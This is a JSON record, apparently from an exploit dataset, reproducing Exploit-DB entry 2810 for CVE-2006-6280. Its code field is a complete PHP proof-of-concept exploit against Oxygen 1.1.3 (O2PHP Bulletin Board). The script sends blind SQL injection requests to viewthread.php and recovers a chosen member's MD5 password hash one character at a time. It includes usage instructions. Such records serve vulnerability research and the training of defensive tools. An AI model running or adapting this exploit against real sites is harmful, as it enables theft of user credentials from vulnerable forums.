{
  "id": "2810",
  "title": "Oxygen 1.1.3 (O2PHP Bulletin Board) - SQL Injection",
  "cve": "CVE-2006-6280",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/php\r\n<?\r\n\r\nif($argc<4){\r\n print(\"\r\n -------------------------------------------------------\r\n Affected.scr..: Oxygen <= 1.1.3 (O2PHP Bulletin Board)\r\n Poc.ID........: 14061118\r\n Type..........: SQL Injection\r\n Risk.level....: Medium\r\n Conditions....: register_globals = on\r\n Src.download..: download.o2php.com\r\n Poc.link......: acid-root.new.fr/poc/14061118.txt\r\n Credits.......: DarkFig\r\n Note..........: FOR EDUCATIONAL PURPOSE ONLY\r\n -------------------------------------------------------\r\n Usage.........: php 14061118.txt <host> <path> <userid>\r\n -------------------------------------------------------\\n\");\r\n exit(1);\r\n}\r\n\r\nprint \"\\n Please be patient (max=736 hits)...\\n MD5: \";\r\n$host = !preg_match(\"/^http:\\/\\/(\\S*)/\",$argv[1],$hwttp) ? $argv[1] : $hwttp[1];\r\n$path = $argv[2];\r\n$usid = intval($argv[3]);\r\n$tabl = \"o2_members\";\r\n\r\nfor($x=1;  $x<=32; $x++) {\r\nfor($y=48; $y<=71; $y++) {\r\n\r\n$recv  = '';\r\n$sqli  = \"%20UNION%20SELECT%201,1%20FROM%20\".$tabl.\"%20WHERE%20uid=\".$usid.\"%20AND%20substr(password,\".$x.\",1)=char(\".$y.\")%23\";\r\n$data  = \"GET \".$path.\"viewthread.php?tid=1&pid=-1\".$sqli.\" HTTP/1.1 \\r\\n\";\r\n$data .= \"Host: $host\\r\\n\";\r\n$data .= \"Connection: Close\\r\\n\\r\\n\";\r\n\r\nif(!$sock  = @fsockopen($host, 80)) die(\"Connection problem\\n\");\r\nfputs($sock, $data);\r\n\r\nwhile(!feof($sock)) $recv .= fgets($sock);\r\nfclose($sock);\r\n\r\nif(preg_match(\"/Location: viewthread.php/\", $recv)) {\r\n  print strtolower(chr($y));\r\n  break;\r\n} elseif($y == 71) {\r\n  print \"Not vulnerable\\n\";\r\n  exit(1);\r\n\r\n}}}\r\n\r\nprint \"\\n\";\r\nexit(0);\r\n\r\n?>\r\n\r\n# milw0rm.com [2006-11-18]",
  "url": "https://www.exploit-db.com/exploits/2810"
}